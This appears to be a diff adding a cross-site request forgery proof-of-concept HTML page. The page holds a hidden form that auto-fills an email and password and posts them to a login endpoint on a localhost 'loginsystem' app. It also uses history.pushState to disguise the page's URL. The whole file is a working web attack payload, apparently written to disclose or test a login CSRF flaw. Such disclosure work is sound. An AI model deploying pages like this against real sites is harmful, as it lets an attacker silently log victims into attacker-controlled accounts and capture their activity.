@@ -1,0 +1,14 @@
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://localhost/loginsystem/" method="POST">
+      <input type="hidden" name="uemail" value="user1@mail.com" />
+      <input type="hidden" name="password" value="User@1234" />
+      <input type="hidden" name="login" value="LOG&#32;IN" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+
